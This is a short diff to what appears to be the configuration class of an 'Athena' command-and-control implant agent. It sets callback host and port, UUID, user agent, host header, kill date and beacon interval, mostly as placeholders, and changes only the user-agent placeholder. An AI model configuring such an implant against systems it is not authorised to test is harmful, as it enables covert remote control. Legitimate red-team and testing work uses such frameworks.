@@ -32,7 +32,7 @@ namespace Athena.Config
             string callbackHost = "callback_host";
             string callbackURL = $"{callbackHost}:{callbackPort}";
             this.uuid = "2ecc5761-ba9e-464e-8969-f8ad6650dc11";
-            this.userAgent = "%USERAGENT%";
+            this.userAgent = "user-agent";
             this.hostHeader = "%HOSTHEADER%";
             this.killDate = DateTime.Parse("killdate");
             this.sleep = Int32.Parse("callback_interval");
